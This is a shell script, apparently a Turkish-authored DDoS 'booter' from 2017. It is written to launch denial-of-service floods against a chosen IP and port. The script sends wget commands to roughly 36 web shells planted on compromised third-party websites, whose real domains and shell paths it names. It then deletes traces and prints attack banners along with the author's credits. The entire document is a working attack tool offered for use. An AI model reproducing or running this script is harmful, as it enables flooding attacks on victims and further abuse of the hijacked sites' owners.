# VPS Spoof/RAW Booter Script V1 Concept By ESERBEY BeyazPolis
# Kullanim Altta
# http://IP/v1.php?key=key&host=host&port=port&time=time&method=method
# Method Degişkeni Calışıyor Fakat Zombi Botnet Amaclı Kullanıldıgı İcin Aktif Deil AKTİF ETMEK İSTİYORSANIZ DEGİŞKEN BÖLÜMÜNDEKİ "#" KARE Yİ SİLİN VE ZOMBİ
# UZANTILARINA METHOD DEGİŞKENİNİ EKLEYİN.

#!/bin/sh
#Degişken Ayarlari

ip=$1
port=$2
time=$3
# method=$4
#Komut Yollama Ve Api Ayarlari
wget "http://www.kuyubasifidanligi.com/wp-content/themes/twentyeleven/404.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://mojabih.studionovex.com/wp-content/themes/twentyfifteen/inc/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://www.mypersonalinjuryclaims.com/wp-content/themes/personal_interest/inc/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://www.britishbedandbreakfasts.com/wp-content/themes/twentyfifteen/inc/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://hydropower.com.tr/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://amorous.co.za/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://registrations.myils.org/templates/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://www.cubeadvt.in/wp-content/plugins/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://soarimpex.com/wp-content/themes/spacious/inc/functions.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://buzzfountain.net/wp-content/themes/twentyeleven/404.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://bloomdh.com/wp-content/themes/edil/404.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://maharashtramaza.tv/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://baotinphat.com.vn/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://ma-datapas.sch.id/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://pasionporladanza.es/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://eehd.com.pk/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://alcc.lv/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://hkstudio.ir/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://asendtex.com/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://giverooms.com/wp-admin/network/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://www.kalvariafarm.hu/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://www.rppgt.ru/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://universalreflection.com/administrator/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://maytapsaigon.com/administrator/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://ozgeekz.com.au/wp-content/themes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://sixtolyf.com/wp-includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://www.fisica.uem.mz/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://marcella.com.pl/wp-includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://confiait.com/wp-includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://lafitorracanovas.com/wp-includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://208cares.org/wp-content/plugins/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://buborekfocizz.eu/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://latribunaformosa.com.ar/wp-includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://employerdirectory.ictc-ctic.ca/wp-includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://www.redderadioscatolicas.org/wp-content/themes/twentyfourteen/up.php?act=phptools&host=$ip&time=$time&port=$port" &
wget "http://baithi.it.caodangnghehcm.edu.vn/includes/up.php?act=phptools&host=$ip&time=$time&port=$port" &


sleep $time
sleep 6
clear;

rm -rf udp.php* 404.php* up.php* v1.php* functions.php*

RED='\033[0;31m'
CYAN="\033[0;36m"
GREEN='\033[0;32m'
printf "${CYAN}Zombie Bots Is $ip:$port Connect Packets Uploading... For $time Seccond ATTACK\n"
printf "${CYAN}Zombie Bots Is Target İP Connect Succesfully!\n"

#Echo Ayarlari
printf "${GREEN}Auto Api VPS Spoof/RAW BOTNET Script Started Coded By EserBey/REDTEEN SALDIRI TIM \n"
printf "${RED}DDoS Started!   Hedef: $ip   Port: $port   Time: $time   Method: $method\n"
printf "${RED}DDoS İnfo [+] Toplam Zombi Sayisi: 45 // Online Zombi Sayisi: 45 // Suanda Calişan Zombi Sayisi: 45\n"

#Bu Script Tamamen ESERBEY'dan Kodlanma Bir Scripttir.
#Coded By ESERBEY 2017 V1 Version
#İletişim Adreslerimiz https://www.facebook.com/EserrBey // REDTeen // BeyazPolis //
